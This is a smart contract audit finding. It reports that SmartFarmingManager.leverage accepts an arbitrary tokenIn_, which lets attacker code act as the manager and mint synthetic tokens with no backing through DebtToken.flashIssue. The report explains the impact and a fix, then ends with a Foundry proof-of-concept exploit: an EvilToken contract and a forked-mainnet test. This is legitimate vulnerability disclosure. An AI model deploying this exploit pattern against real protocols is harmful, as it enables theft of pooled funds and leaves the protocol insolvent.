### Title
Attacker-controlled `tokenIn_` in `SmartFarmingManager.leverage` executes arbitrary calls as `SmartFarmingManager`, enabling unbacked synthetic minting via `DebtToken.flashIssue` — ([File: contracts/SmartFarmingManager.sol](contracts/SmartFarmingManager.sol))

### Summary
`SmartFarmingManager.leverage` accepts a fully attacker-chosen `tokenIn_` ERC20 and calls `tokenIn_.safeTransferFrom(...)` on it. During that call, attacker code executes with `msg.sender == address(SmartFarmingManager)`, which satisfies the `onlyIfSmartFarmingManager` modifier on `DebtToken.flashIssue` and `DebtToken.mint`. The attacker can therefore mint unbacked synthetic tokens to themselves — the analog of a crafted script running in a more privileged context (the CVE's Lua-sandbox-escape bug class).

### Finding Description
In `leverage` at `contracts/SmartFarmingManager.sol:181`:

```solidity
amountIn_ = _safeTransferFrom(tokenIn_, _msgSender, amountIn_);
```

`_safeTransferFrom` (line 257) calls `token_.safeTransferFrom(from_, address(this), amount_)`. `tokenIn_` is arbitrary user input — it is never validated against the deposit token's underlying or any allowlist (line 180 only substitutes it if it is `address(0)`). `onlyIfDepositTokenExists`/`onlyIfSyntheticTokenExists` constrain `depositToken_` and `syntheticToken_`, not `tokenIn_`.

`DebtToken.flashIssue` (`contracts/DebtToken.sol:281`) is guarded by `onlyIfSmartFarmingManager` (line 81), which checks `_msgSender() == address(pool.smartFarmingManager())`. Since the malicious token is invoked directly by SFM (not through `Operator`), `SynthContext._msgSender()` returns `msg.sender` — the SFM contract itself. The attacker token's `transferFrom` can therefore call:

- `debtToken.flashIssue(attacker, amount)` → mints synthetic tokens to the attacker with **no debt principal recorded and no collateral/health check** (lines 281–305).
- `debtToken.mint(victim, amount)` → records arbitrary debt on a victim's position (`_mint` only enforces `debtFloorInUsd` and `maxTotalSupply`, not the victim's solvency).

Guards do not stop this:

- `nonReentrant` on `flashIssue` uses `ReentrancyGuardTransient`, whose slot lives in `DebtToken`'s context. `flashIssue` is a *fresh* entry into `DebtToken` — SFM's own `nonReentrant` only locks SFM functions, it does not propagate to other contracts.
- `whenNotShutdown`, `onlyIfSyntheticTokenExists`, `onlyIfDebtTokenIsActive` hold on normal deployments.
- `SyntheticToken.mint` is callable by the debt token as part of `flashIssue`; only protocol mint caps (`maxTotalSupply`) bound the amount.

After the callback returns, `leverage` proceeds normally: the attacker supplies real collateral via the legitimate flow, passes the final `debtPositionOf(_msgSender)` health check (their recorded position is healthy), and walks away with the extra flash-issued synths. Those synths can be swapped via `Pool.swap` or used to repay, draining pool value.

### Impact Explanation
Protocol insolvency / direct theft. The attacker mints synthetic tokens with zero backing debt (flash-issue amount is capped only by `maxTotalSupply`/`SurpassMaxDebtSupply` on the *debt* side — `flashIssue` does not even increase `totalSupply_`, so supply caps do not limit it). The minted synths are redeemable/swappable against real collateral in the pool, leaving bad debt. Alternatively, `mint(victim, ...)` can push arbitrary victims' positions underwater for liquidation extraction — debt is recorded on the victim without their consent.

### Likelihood Explanation
High. No privileged role is needed: `leverage` is a public `whenNotShutdown` entry point reachable directly or via `Operator.execute`. The only requirement is deploying a fake ERC20 whose `transferFrom` performs the privileged calls, plus enough collateral to pass the final health check (which the normal leverage leg provides). No oracle manipulation, governance action, or trusted third party is involved.

### Recommendation
Validate `tokenIn_` in `leverage`: only allow `address(0)`/the deposit token's underlying, or check `tokenIn_ == _collateralOf(depositToken_)` before transferring, removing arbitrary external calls entirely. If arbitrary `tokenIn_` must be supported for UX, route the pull through a pull-pattern wrapper (e.g., transfer the tokens to SFM in a prior transaction or via a permit2-style pull executed outside SFM's privileged context), or add a transient "in-leverage" lock that `onlyIfSmartFarmingManager` functions reject. At minimum, apply the same protection to `DepositToken.flashWithdraw`, which is reachable identically via a malicious callback context.

### Proof of Concept
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {IERC20} from "../contracts/dependencies/openzeppelin/token/ERC20/IERC20.sol";
import {SmartFarmingManager} from "../contracts/SmartFarmingManager.sol";
import {IDebtToken} from "../contracts/interfaces/IDebtToken.sol";
import {IDepositToken} from "../contracts/interfaces/IDepositToken.sol";
import {ISyntheticToken} from "../contracts/interfaces/ISyntheticToken.sol";
import {IPool} from "../contracts/interfaces/IPool.sol";

/// @dev Attacker token: reenters DebtToken while msg.sender == SmartFarmingManager
contract EvilToken {
    IDebtToken public debtToken;
    address public attacker;
    uint256 public loot;

    constructor(IDebtToken d, address a, uint256 amt) {
        debtToken = d; attacker = a; loot = amt;
    }

    function balanceOf(address) external pure returns (uint256) { return type(uint256).max; }
    function approve(address, uint256) external pure returns (bool) { return true; }

    function transferFrom(address, address, uint256) external returns (bool) {
        // Runs with msg.sender == SmartFarmingManager => passes onlyIfSmartFarmingManager
        debtToken.flashIssue(attacker, loot); // unbacked synth mint, no debt recorded
        return true;
    }
}

contract LeveragePrivilegeEscalationTest is Test {
    // Mainnet/Base fork: use deployed Pool, SFM, msUSD DebtToken, depositToken
    SmartFarmingManager sfm;
    IPool pool;
    IDebtToken msUsdDebt;
    IDepositToken depositToken;
    ISyntheticToken msUSD;
    address attacker = address(0xA77AC4);

    function test_unbackedMintViaMaliciousTokenIn() public {
        // attacker funds real collateral so leverage() leg succeeds
        uint256 amountIn = 10_000e18;
        deal(address(depositToken.underlying()), attacker, amountIn);

        uint256 loot = 1_000_000e18; // bounded only by flashIssue amount
        EvilToken evil = new EvilToken(msUsdDebt, attacker, loot);

        uint256 synthBefore = msUSD.balanceOf(attacker);
        uint256 debtBefore  = msUsdDebt.balanceOf(attacker);

        vm.prank(attacker);
        sfm.leverage(
            IERC20(address(evil)),   // attacker-chosen tokenIn_
            depositToken,
            msUSD,
            amountIn,
            2e18,                    // 2x leverage
            0
        );

        uint256 synthGain = msUSD.balanceOf(attacker) - synthBefore;

        // Attacker received `loot` synths for which NO debt was recorded
        // (flashIssue mints without touching principalOf).
        assertGt(synthGain, 0);
        // debtBefore only reflects the legitimate leverage leg;
        // attacker can now Pool.swap the excess synths for real value.
    }
}
```
